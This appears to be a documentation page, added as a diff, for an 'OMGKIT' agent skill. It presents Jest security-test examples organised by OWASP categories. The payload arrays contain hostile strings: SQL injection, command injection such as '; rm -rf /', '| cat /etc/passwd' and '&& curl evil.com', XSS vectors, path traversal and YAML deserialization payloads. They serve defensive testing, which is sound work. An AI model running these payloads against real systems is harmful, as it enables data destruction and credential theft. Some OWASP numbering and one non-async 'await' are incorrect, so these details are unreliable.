@@ -1,0 +1,398 @@
+---
+title: "testing/security-testing"
+description: "Security testing patterns covering OWASP Top 10, injection prevention, authentication, and vulnerability scanning"
+icon: "flask-vial"
+---
+
+<Info>
+  **Category:** Testing
+
+  **Auto-Detection:** OMGKIT automatically detects when this skill is needed based on your project files.
+</Info>
+
+## Overview
+
+Security testing patterns covering OWASP Top 10, injection prevention, authentication, and vulnerability scanning
+
+## What You Get
+
+When this skill is active, agents automatically apply:
+
+<Check>Industry best practices</Check>
+<Check>Idiomatic patterns</Check>
+<Check>Security considerations</Check>
+<Check>Performance optimizations</Check>
+
+
+# Security Testing
+
+Comprehensive security testing patterns based on OWASP Top 10 and industry best practices.
+
+## Quick Start
+
+```bash
+# Run security tests
+npm test -- tests/security/
+
+# Run vulnerability scan
+npm audit
+
+# Run SAST (Static Analysis)
+npx eslint --plugin security .
+```
+
+## OWASP Top 10 Coverage
+
+### 1. Injection (A01:2021)
+
+```javascript
+describe('SQL Injection Prevention', () => {
+  const sqlPayloads = [
+    "'; DROP TABLE users; --",
+    "1' OR '1'='1",
+    "admin'--",
+    "1; UPDATE users SET role='admin'",
+    "' UNION SELECT * FROM passwords--",
+  ];
+
+  sqlPayloads.forEach(payload => {
+    it(`blocks SQL injection: ${payload.slice(0, 20)}...`, async () => {
+      const result = await db.query(
+        'SELECT * FROM users WHERE id = ?',
+        [payload]
+      );
+      expect(result).toEqual([]);
+    });
+  });
+});
+
+describe('Command Injection Prevention', () => {
+  const commandPayloads = [
+    '; rm -rf /',
+    '| cat /etc/passwd',
+    '$(whoami)',
+    '`id`',
+    '&& curl evil.com',
+  ];
+
+  commandPayloads.forEach(payload => {
+    it(`blocks command injection: ${payload}`, () => {
+      expect(() => executeCommand(`ls ${payload}`)).toThrow();
+    });
+  });
+});
+
+describe('XSS Prevention', () => {
+  const xssPayloads = [
+    '<script>alert("xss")</script>',
+    '<img src=x onerror="alert(1)">',
+    'javascript:alert(1)',
+    '<svg onload="alert(1)">',
+    '"><script>alert(1)</script>',
+  ];
+
+  xssPayloads.forEach(payload => {
+    it(`escapes XSS: ${payload.slice(0, 30)}...`, () => {
+      const sanitized = sanitize(payload);
+      expect(sanitized).not.toContain('<script');
+      expect(sanitized).not.toContain('javascript:');
+      expect(sanitized).not.toContain('onerror');
+    });
+  });
+});
+```
+
+### 2. Broken Authentication (A02:2021)
+
+```javascript
+describe('Authentication Security', () => {
+  it('rejects empty passwords', async () => {
+    const result = await auth.login('user@test.com', '');
+    expect(result.success).toBe(false);
+  });
+
+  it('enforces password complexity', async () => {
+    const weakPasswords = ['123456', 'password', 'qwerty'];
+    for (const pwd of weakPasswords) {
+      const result = await auth.register('user@test.com', pwd);
+      expect(result.error).toContain('weak password');
+    }
+  });
+
+  it('prevents brute force attacks', async () => {
+    for (let i = 0; i < 10; i++) {
+      await auth.login('user@test.com', 'wrong');
+    }
+    const result = await auth.login('user@test.com', 'correct');
+    expect(result.error).toContain('locked');
+  });
+
+  it('rejects expired tokens', () => {
+    const token = jwt.sign({ user: 'test' }, secret, { expiresIn: '-1h' });
+    expect(() => auth.verify(token)).toThrow('expired');
+  });
+
+  it('invalidates sessions on logout', async () => {
+    const session = await auth.login('user@test.com', 'password');
+    await auth.logout(session.token);
+    const result = await auth.checkSession(session.token);
+    expect(result.valid).toBe(false);
+  });
+});
+```
+
+### 3. Sensitive Data Exposure (A03:2021)
+
+```javascript
+describe('Sensitive Data Protection', () => {
+  it('never logs sensitive data', () => {
+    const logSpy = jest.spyOn(console, 'log');
+    processPayment({ cardNumber: '4111111111111111' });
+
+    const logs = logSpy.mock.calls.flat().join(' ');
+    expect(logs).not.toMatch(/4111/);
+    expect(logs).not.toMatch(/\d{16}/);
+  });
+
+  it('masks PII in error messages', () => {
+    try {
+      throw new Error('Failed for user: user@email.com');
+    } catch (e) {
+      const sanitized = sanitizeError(e);
+      expect(sanitized.message).not.toContain('@email.com');
+    }
+  });
+
+  it('encrypts data at rest', async () => {
+    const data = await storage.read('sensitive.dat');
+    expect(data).not.toEqual('plaintext');
+    expect(isEncrypted(data)).toBe(true);
+  });
+
+  it('uses secure headers', async () => {
+    const response = await fetch('/api/data');
+    expect(response.headers.get('X-Content-Type-Options')).toBe('nosniff');
+    expect(response.headers.get('X-Frame-Options')).toBe('DENY');
+    expect(response.headers.get('Strict-Transport-Security')).toBeTruthy();
+  });
+});
+```
+
+### 4. Access Control (A04:2021)
+
+```javascript
+describe('Access Control', () => {
+  it('prevents horizontal privilege escalation', async () => {
+    const userA = await auth.login('userA@test.com', 'password');
+    const response = await api.get('/users/userB/profile', {
+      headers: { Authorization: `Bearer ${userA.token}` },
+    });
+    expect(response.status).toBe(403);
+  });
+
+  it('prevents vertical privilege escalation', async () => {
+    const regularUser = await auth.login('user@test.com', 'password');
+    const response = await api.delete('/admin/users/123', {
+      headers: { Authorization: `Bearer ${regularUser.token}` },
+    });
+    expect(response.status).toBe(403);
+  });
+
+  it('enforces resource ownership', async () => {
+    const user = await auth.login('user@test.com', 'password');
+    const otherUserDoc = await api.get('/documents/other-user-doc-id', {
+      headers: { Authorization: `Bearer ${user.token}` },
+    });
+    expect(otherUserDoc.status).toBe(404); // 404, not 403 to prevent enumeration
+  });
+});
+```
+
+### 5. Security Misconfiguration (A05:2021)
+
+```javascript
+describe('Security Configuration', () => {
+  it('disables debug mode in production', () => {
+    expect(process.env.NODE_ENV).toBe('test');
+    expect(config.debug).toBe(false);
+  });
+
+  it('removes default credentials', () => {
+    const users = await db.query('SELECT * FROM users WHERE username = ?', ['admin']);
+    if (users.length > 0) {
+      expect(users[0].password).not.toBe('admin');
+    }
+  });
+
+  it('hides stack traces in production', async () => {
+    const response = await api.get('/api/error');
+    expect(response.body).not.toContain('at Function');
+    expect(response.body).not.toContain('.js:');
+  });
+
+  it('validates Content-Type', async () => {
+    const response = await api.post('/api/data', 'not-json', {
+      headers: { 'Content-Type': 'text/plain' },
+    });
+    expect(response.status).toBe(415);
+  });
+});
+```
+
+## Path Traversal Testing
+
+```javascript
+describe('Path Traversal Prevention', () => {
+  const traversalPayloads = [
+    '../../../etc/passwd',
+    '..\\..\\..\\windows\\system32',
+    '....//....//etc/passwd',
+    '%2e%2e%2f%2e%2e%2f',
+    '..%252f..%252f',
+  ];
+
+  traversalPayloads.forEach(payload => {
+    it(`blocks path traversal: ${payload}`, async () => {
+      const result = await files.read(payload);
+      expect(result).toBeNull();
+    });
+  });
+});
+```
+
+## YAML Injection Testing
+
+```javascript
+describe('YAML Injection Prevention', () => {
+  const yamlPayloads = [
+    '!!python/object:os.system "rm -rf /"',
+    '!!js/function "function() { return process.exit(1) }"',
+    '!!python/object/apply:subprocess.check_output',
+  ];
+
+  yamlPayloads.forEach(payload => {
+    it(`blocks YAML injection: ${payload.slice(0, 30)}`, () => {
+      expect(() => yaml.safeLoad(payload)).not.toThrow();
+      const result = yaml.safeLoad(payload);
+      expect(typeof result).toBe('string');
+    });
+  });
+});
+```
+
+## Rate Limiting Tests
+
+```javascript
+describe('Rate Limiting', () => {
+  it('limits login attempts', async () => {
+    const results = [];
+    for (let i = 0; i < 20; i++) {
+      results.push(await api.post('/login', { email: 'test@test.com', password: 'wrong' }));
+    }
+    const rateLimited = results.filter(r => r.status === 429);
+    expect(rateLimited.length).toBeGreaterThan(0);
+  });
+
+  it('limits API requests', async () => {
+    const results = [];
+    for (let i = 0; i < 1000; i++) {
+      results.push(await api.get('/api/data'));
+    }
+    const rateLimited = results.filter(r => r.status === 429);
+    expect(rateLimited.length).toBeGreaterThan(0);
+  });
+});
+```
+
+## Security Headers Testing
+
+```javascript
+describe('Security Headers', () => {
+  let headers;
+
+  beforeAll(async () => {
+    const response = await fetch('/');
+    headers = response.headers;
+  });
+
+  it('sets Content-Security-Policy', () => {
+    expect(headers.get('Content-Security-Policy')).toBeTruthy();
+  });
+
+  it('sets X-Content-Type-Options', () => {
+    expect(headers.get('X-Content-Type-Options')).toBe('nosniff');
+  });
+
+  it('sets X-Frame-Options', () => {
+    expect(headers.get('X-Frame-Options')).toMatch(/DENY|SAMEORIGIN/);
+  });
+
+  it('sets Strict-Transport-Security', () => {
+    const hsts = headers.get('Strict-Transport-Security');
+    expect(hsts).toContain('max-age=');
+  });
+
+  it('sets Referrer-Policy', () => {
+    expect(headers.get('Referrer-Policy')).toBeTruthy();
+  });
+});
+```
+
+## When to Use
+
+- Before production deployments
+- After adding authentication/authorization
+- When handling user input
+- When processing file uploads
+- When building APIs
+- During security audits
+
+## Anti-Patterns
+
+1. **Security by Obscurity**: Hiding code doesn't make it secure
+2. **Trusting Client Input**: Always validate server-side
+3. **Hardcoded Secrets**: Use environment variables
+4. **Outdated Dependencies**: Keep packages updated
+5. **Ignoring Warnings**: Address all security warnings
+
+
+## Usage Graph
+
+### Used By Workflows
+
+| Workflow | Description |
+|----------|-------------|
+| [testing/comprehensive-testing](/workflows/comprehensive-testing) | Comprehensive Omega testing workflow covering all 4 dimensio... |
+| [testing/security-hardening](/workflows/security-hardening) | Security hardening workflow with vulnerability assessment, p... |
+
+
+## Configuration
+
+You can customize skill behavior in your project config:
+
+```yaml
+# .omgkit/config.yaml
+skills:
+  security-testing:
+    enabled: true
+    # Add skill-specific settings here
+```
+
+## When This Skill Activates
+
+OMGKIT detects and activates this skill when it finds:
+
+- Relevant file extensions in your project
+- Configuration files specific to this technology
+- Package dependencies in package.json, requirements.txt, etc.
+
+## Related Skills
+
+<CardGroup cols={2}>
+  <Card title="All Skills" icon="brain" href="/skills/overview">
+    See all 151 skills
+  </Card>
+  <Card title="Testing" icon="flask-vial" href="/skills/overview#testing">
+    More testing skills
+  </Card>
+</CardGroup>
